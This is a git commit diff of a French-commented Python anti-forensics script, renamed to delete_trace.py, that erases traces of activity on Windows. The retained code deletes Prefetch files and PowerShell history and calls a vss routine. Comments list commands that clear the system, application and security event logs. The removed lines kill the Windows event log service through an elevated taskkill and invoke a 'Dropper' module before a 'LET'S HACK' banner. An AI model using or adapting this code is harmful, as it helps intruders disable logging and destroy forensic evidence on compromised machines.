0fc18d5b4d90f0baaba9829f3c5b740a034fc43f
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-06-24 14:16:44 +0200

    Update and rename deletefile.py to delete_trace.py

--- delete_trace.py
+++ delete_trace.py
@@ -15,14 +15,6 @@ clear des logs windows ==> wevtutil cl system ; wevtutil cl application ; wevtut
 delete les fichiers qui pourraient etre créé (Secure Delete) ==> Voir Sdelete
 Delete les commandes powershell => Clear-History && C:\\Users\\Clément\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
 """
-try:
-	ascii_banner = pyfiglet.figlet_format("LET'S  HACK \n")
-	print(ascii_banner)
-except:
-	pass
-
-
-
 
 def delete_prefetch():
 	windows = os.environ['WINDIR'] + "\Prefetch"
@@ -84,51 +76,15 @@ def powershell_history():
 		print("Le fichier n'existe pas")
 
 
-def try_kill(pid):
-    try:
-        os.popen(f"powershell \"Start-Process powershell -Verb runas 'taskkill /PID {pid} /F '\"")
-        return True
-    except:
-        return False
-
-def disable_logs():
-	#commande = 'auditpol /clear /y'
-    #commande_disable_logs = "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId"
-	disable_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
-	output = disable_log.read()
-	output = int(output)
-	print(output)
-	if output == 0:
-		pass
-		return True
-	else:
-		if try_kill(output):
-			time.sleep(5)
-			get_id_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
-			output_id = get_id_log.read()
-			print(output_id)
-			output_id = int(output_id)
-			if output_id == 0:
-				print("C'est tout bon")
-				return True
-			else:
-				print(u"Output ID != 0")
-				return False
-		else:
-			print(u"Try Kill pas marché ")
-			return False
 """
 def clear_logs():
 	commande = "wevtutil cl system && wevtutil cl application && wevtutil cl security"
 """
 def main():
-	if Dropper.main():
-		if disable_logs():
-			vss()
-			delete_prefetch()
-		powershell_history()
-	test = input("Tapes sur  Enter ...")
+	vss()
+	delete_prefetch()
+	powershell_history()
 
-main()
+#main()
 #Pour lister les répertoire et les envoyer
 #dir /path/ >> %temp%/nom.txt
